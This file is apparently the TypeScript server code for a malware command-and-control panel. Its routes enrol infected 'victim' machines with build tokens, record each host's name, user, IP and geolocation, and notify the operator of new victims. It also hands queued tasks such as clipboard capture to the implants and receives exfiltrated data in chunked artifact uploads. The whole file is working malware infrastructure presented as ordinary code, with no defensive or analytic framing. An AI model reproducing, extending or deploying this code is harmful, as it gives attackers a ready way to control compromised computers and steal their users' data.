import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { prisma } from '../lib/db';
import { buildTokenHash, randomToken, sealSecret, sha256hex } from '../lib/crypto';
import { authenticateVictim } from '../plugins/victim-auth';
import { bad, HttpError, notFound, unauth } from '../lib/errors';
import { geo } from '../lib/geo';
import { publish } from '../lib/bus';
import { notifyVictimNew } from '../services/notify';
import { commitUpload, initUpload, writeChunk } from '../services/artifact';
import { applyTaskResult } from '../lib/task-result';

const enrollSchema = z.object({
  build_token: z.string().min(8).max(128),
  build_id: z.string().uuid(),
  hostname: z.string().min(1).max(128),
  os: z.enum(['windows', 'linux', 'macos']),
  os_version: z.string().max(128).default(''),
  arch: z.enum(['x86_64', 'aarch64']).default('x86_64'),
  username: z.string().min(1).max(128),
  agent_version: z.string().max(32).default(''),
  profile: z.enum(['lite', 'full']).default('full'),
  modules: z.array(z.string().max(32)).max(16).default([])
});

const hbSchema = z.object({
  status: z.enum(['ok', 'degraded']),
  uptime_s: z.number().int().min(0),
  modules: z.record(z.string(), z.string().max(64)),
  counters: z.record(z.string(), z.number().int()),
  profile: z.enum(['lite', 'full']),
  pending_artifact: z.string().uuid().nullable().optional(),
  agent_version: z.string().max(32).default('')
});

const resultSchema = z.object({
  status: z.enum(['ok', 'error', 'cancelled']),
  error: z.string().max(2000).nullable().optional(),
  result: z.record(z.unknown()).default({}),
  artifacts: z.array(z.object({ upload_request: z.string().uuid() })).max(32).default([])
});

const uploadSchema = z.object({
  task_id: z.string().uuid().nullable().optional(),
  module: z.string().min(1).max(64),
  container_version: z.literal(1),
  total_size: z.number().int().positive(),
  chunk_count: z.number().int().positive(),
  sha256: z.string().regex(/^[0-9a-f]{64}$/)
});

const commitSchema = z.object({ sha256: z.string().regex(/^[0-9a-f]{64}$/), chunk_count: z.number().int().positive() });

function signed(victim: { lastHeartbeatAt: Date }): boolean {
  return Date.now() - victim.lastHeartbeatAt.getTime() < 90_000;
}

export const agentRoutes: FastifyPluginAsync = async (app) => {
  app.post('/enroll', { config: { rateLimit: { max: 20, timeWindow: '1 minute' } } }, async (request, reply) => {
    const input = enrollSchema.parse(request.body);
    const build = await prisma.build.findUnique({ where: { tokenHash: sha256hex(input.build_token) } });
    if (!build) throw unauth('unknown_build');
    if (build.revokedAt || build.status === 'revoked') throw new HttpError(403, 'build_revoked', 'build revoked');

    const deviceToken = randomToken(32);
    const location = geo(request.clientIp);
    const existing = await prisma.victim.findUnique({
      where: { buildId_hostname_username: { buildId: build.id, hostname: input.hostname, username: input.username } }
    });
    const victim = await prisma.victim.upsert({
      where: { buildId_hostname_username: { buildId: build.id, hostname: input.hostname, username: input.username } },
      update: {
        os: input.os,
        osVersion: input.os_version,
        arch: input.arch,
        profile: input.profile,
        agentVersion: input.agent_version,
        deviceTokenEnc: sealSecret(deviceToken),
        ip: request.clientIp,
        country: location.country,
        countryCode: location.countryCode,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        status: 'online',
        lastHeartbeatAt: new Date(),
        revokedAt: null
      },
      create: {
        buildId: build.id,
        hostname: input.hostname,
        os: input.os,
        osVersion: input.os_version,
        arch: input.arch,
        username: input.username,
        profile: input.profile,
        agentVersion: input.agent_version,
        deviceTokenEnc: sealSecret(deviceToken),
        ip: request.clientIp,
        country: location.country,
        countryCode: location.countryCode,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        status: 'online'
      }
    });
    if (!existing) {
      await prisma.event.create({ data: { victimId: victim.id, kind: 'enrolled', data: { ip: request.clientIp } } });
      await notifyVictimNew(victim);
      void publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname: victim.hostname, os: victim.os } });
    }
    return reply.code(201).send({
      victim_id: victim.id,
      device_token: deviceToken,
      server_time: Math.floor(Date.now() / 1000),
      heartbeat_interval: 30,
      poll_interval: 20,
      config_version: 1
    });
  });

  const authed = { preHandler: authenticateVictim };

  app.post('/hb', authed, async (request) => {
    const victim = request.victim!;
    const input = hbSchema.parse(request.body);
    const location = geo(request.clientIp);
    await prisma.victim.update({
      where: { id: victim.id },
      data: {
        status: input.status === 'ok' ? 'online' : 'stale',
        lastHeartbeatAt: new Date(),
        agentVersion: input.agent_version || victim.agentVersion,
        ip: request.clientIp,
        ...(location.country ? { country: location.country, countryCode: location.countryCode, city: location.city, lat: location.lat, lon: location.lon } : {})
      }
    });
    const urgent = await prisma.task.count({
      where: { victimId: victim.id, status: 'queued', name: { in: ['clip_start', 'clip_stop', 'cancel'] } }
    });
    void publish({
      type: 'victim.heartbeat',
      victimId: victim.id,
      at: Date.now(),
      data: { status: input.status, modules: input.modules, counters: input.counters, ip: request.clientIp }
    });
    return { ok: true, poll_now: urgent > 0, config_version: 1 };
  });

  app.get('/tasks', authed, async (request) => {
    const victim = request.victim!;
    const limit = Math.min(32, Math.max(1, Number((request.query as { limit?: string }).limit ?? 8)));
    if (!signed(victim)) throw bad('stale', 'heartbeat first', 409);
    const now = new Date();
    const rows = await prisma.task.findMany({
      where: { victimId: victim.id, notBefore: { lte: now }, OR: [{ status: 'queued' }, { status: 'running', leaseUntil: { lt: now } }] },
      orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
      take: limit
    });
    if (rows.length > 0) {
      await prisma.task.updateMany({
        where: { id: { in: rows.map((row) => row.id) } },
        data: { status: 'running', attempts: { increment: 1 }, leaseUntil: new Date(Date.now() + Math.max(...rows.map((r) => r.timeoutSec)) * 1000) }
      });
      void publish({ type: 'task.update', victimId: victim.id, at: Date.now(), data: { claimed: rows.length } });
    }
    return {
      tasks: rows.map((row) => ({
        id: row.id,
        name: row.name,
        params: row.params as Record<string, unknown>,
        timeout_sec: row.timeoutSec,
        not_before: Math.floor(row.notBefore.getTime() / 1000)
      }))
    };
  });

  app.post('/tasks/:id/result', { ...authed, bodyLimit: 4 * 1024 * 1024 }, async (request, reply) => {
    const victim = request.victim!;
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = resultSchema.parse(request.body);
    const outcome = await applyTaskResult(victim.id, id, input);
    if (outcome === 'missing') throw notFound('task');
    if (outcome === 'conflict') return reply.code(409).send({ error: 'already_finished', message: 'result already stored' });
    return { ok: true };
  });

  app.post('/artifacts', authed, async (request, reply) => {
    const signedVictim = request.victim!;
    const victim = await prisma.victim.findUniqueOrThrow({ where: { id: signedVictim.id }, include: { build: true } });
    const input = uploadSchema.parse(request.body);
    const upload = await initUpload(victim, {
      taskId: input.task_id ?? null,
      module: input.module,
      totalSize: input.total_size,
      chunkCount: input.chunk_count,
      sha256: input.sha256
    });
    return reply.code(201).send({
      upload_id: upload.id,
      chunk_size: 524288,
      received: 0,
      expires_at: Math.floor(upload.expiresAt.getTime() / 1000)
    });
  });

  app.get('/artifacts/:id', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    return { received: upload.received, state: upload.state, expires_at: Math.floor(upload.expiresAt.getTime() / 1000) };
  });

  app.post('/artifacts/:id/chunk', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    const offset = Number((request.query as { offset?: string }).offset);
    if (!Number.isInteger(offset) || offset < 0) throw bad('offset_invalid', 'invalid offset');
    const chunkHash = request.headers['x-chunk-sha256'];
    if (typeof chunkHash !== 'string' || !/^[0-9a-f]{64}$/.test(chunkHash)) throw bad('hash_required', 'X-Chunk-Sha256 required');
    const body = request.rawBody;
    if (!body?.length) throw bad('empty_chunk', 'empty body');
    const received = await writeChunk(upload, offset, body, chunkHash);
    return { ok: true, received };
  });

  app.post('/artifacts/:id/commit', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    const input = commitSchema.parse(request.body);
    const artifact = await commitUpload(upload, input.sha256, input.chunk_count);
    return { artifact_id: artifact.id, status: 'queued' };
  });
};

